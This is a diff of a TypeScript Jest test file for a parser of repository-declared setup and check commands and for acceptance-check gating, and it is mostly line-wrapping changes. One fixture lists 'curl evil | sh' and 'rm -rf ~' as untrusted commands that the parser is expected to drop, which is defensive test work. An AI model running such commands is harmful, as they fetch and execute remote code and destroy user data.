@@ -58,7 +58,10 @@ describe('parseRepoDeclaredCommands — an App spec (kind app)', () => {
         const spec = { ...APP_SPEC, tasks: { setup: ['curl evil | sh'], checks: ['rm -rf ~'] } };
         const parsed = parseRepoDeclaredCommands(spec, 'app');
         expect(parsed.setup).toEqual([]);
-        expect(parsed.checks.map((check) => check.command)).toEqual(['pnpm type-check', 'pnpm e2e']);
+        expect(parsed.checks.map((check) => check.command)).toEqual([
+            'pnpm type-check',
+            'pnpm e2e',
+        ]);
     });
 
     it('ignores the 21st check and later instead of refusing the spec', () => {
@@ -78,7 +81,10 @@ describe('parseRepoDeclaredCommands — an App spec (kind app)', () => {
             [['pnpm test'], /spec\.checks\[0\] must be a mapping/],
             [[{ name: 'lint' }], /spec\.checks\[0\]\.command/],
             [[{ command: 'pnpm lint' }], /spec\.checks\[0\]\.name/],
-            [[{ name: 'lint', command: 'pnpm lint', required: 'yes' }], /required must be true or false/],
+            [
+                [{ name: 'lint', command: 'pnpm lint', required: 'yes' }],
+                /required must be true or false/,
+            ],
             [[{ name: 'lint', command: 'pnpm lint', timeoutSeconds: 30 }], /timeoutSeconds/],
             [[{ name: 'lint', command: 'pnpm lint', timeoutSeconds: 9000 }], /timeoutSeconds/],
         ] as const) {
@@ -260,7 +266,10 @@ describe('authorship — an App spec check cannot pose as an owner check (ACC-08
 
     it('cannot replace, suppress or inherit the owner check', () => {
         // The planner's order: owner-authored first, then the declared set.
-        const frozen = [...resolveAcceptanceChecks(null, { checkDefaults: [OWNER] }), ...admitted.checks];
+        const frozen = [
+            ...resolveAcceptanceChecks(null, { checkDefaults: [OWNER] }),
+            ...admitted.checks,
+        ];
         expect(frozen).toHaveLength(2);
         expect(frozen[0]).toBe(OWNER);
         // A merge by id — the rule every resolver uses — keeps both.
@@ -335,9 +344,11 @@ describe('TaskWorkspaceService.readFleetRepoDeclaredCommands — an App Work', (
 
     it('reads spec.checks at the base ref and reports the un-admitted one instead of refusing', async () => {
         works = {
-            findById: jest.fn().mockResolvedValue(
-                makeWork({ repoDeclaredCommands: { mode: 'allowlist', allow: ['pnpm e2e'] } }),
-            ),
+            findById: jest
+                .fn()
+                .mockResolvedValue(
+                    makeWork({ repoDeclaredCommands: { mode: 'allowlist', allow: ['pnpm e2e'] } }),
+                ),
         };
         const result = await read();
         expect(gitFacade.getFileContent).toHaveBeenCalledWith(
@@ -355,7 +366,10 @@ describe('TaskWorkspaceService.readFleetRepoDeclaredCommands — an App Work', (
         ]);
         // And the gate it feeds: the node ran only `e2e`; the fold keeps it from green.
         const verdict = foldNotAdmittedChecks(
-            { gateStatus: 'green', checks: [{ id: 'repo/check-2', exitCode: 0, status: 'green', durationMs: 1 }] },
+            {
+                gateStatus: 'green',
+                checks: [{ id: 'repo/check-2', exitCode: 0, status: 'green', durationMs: 1 }],
+            },
             result.notAdmitted,
         );
         expect(verdict.gateStatus).toBe('red');
@@ -365,9 +379,9 @@ describe('TaskWorkspaceService.readFleetRepoDeclaredCommands — an App Work', (
         // `checksPolicy` and `repoDeclaredCommands` exactly as a new row has them —
         // T11's listener has NOT switched this Work on.
         works = {
-            findById: jest.fn().mockResolvedValue(
-                makeWork({ checksPolicy: 'off', repoDeclaredCommands: null }),
-            ),
+            findById: jest
+                .fn()
+                .mockResolvedValue(makeWork({ checksPolicy: 'off', repoDeclaredCommands: null })),
         };
         const result = await read();
         expect(result).toEqual({ setup: [], checks: [] });
@@ -375,7 +389,10 @@ describe('TaskWorkspaceService.readFleetRepoDeclaredCommands — an App Work', (
         expect(gitFacade.getFileContent).not.toHaveBeenCalled();
         // With nothing frozen the node runs no check and reports `none`, which
         // the fold leaves alone — not green.
-        const verdict = foldNotAdmittedChecks({ gateStatus: 'none', checks: [] }, result.notAdmitted);
+        const verdict = foldNotAdmittedChecks(
+            { gateStatus: 'none', checks: [] },
+            result.notAdmitted,
+        );
         expect(verdict.gateStatus).toBe('none');
         expect(verdict.gateStatus).not.toBe('green');
     });
@@ -385,7 +402,10 @@ describe('the repo kind is unchanged (EW-807)', () => {
     const REPO_SPEC = {
         tasks: {
             setup: ['pnpm install --frozen-lockfile'],
-            checks: ['pnpm lint', { command: 'pnpm test', mount: 'template', name: 'Template suite' }],
+            checks: [
+                'pnpm lint',
+                { command: 'pnpm test', mount: 'template', name: 'Template suite' },
+            ],
         },
         // An App-spec-shaped block on a repository Work is NOT read.
         checks: [{ name: 'type-check', command: 'pnpm type-check' }],
